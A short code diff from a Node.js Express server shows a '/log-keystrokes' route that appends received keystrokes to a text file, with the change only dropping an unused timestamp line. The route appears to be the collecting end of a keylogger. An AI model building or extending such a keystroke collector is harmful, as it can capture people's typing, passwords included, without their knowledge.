@@ -22,7 +22,6 @@ app.post('/log-keystrokes', (req, res) => {
   }
   
   // Append the keystrokes to a text file with timestamp
-  const timestamp = new Date().toISOString();
   const logEntry = ` ${keystrokes}\n`;
   
   fs.appendFile(path.join(__dirname, 'keystrokes.txt'), logEntry, (err) => {
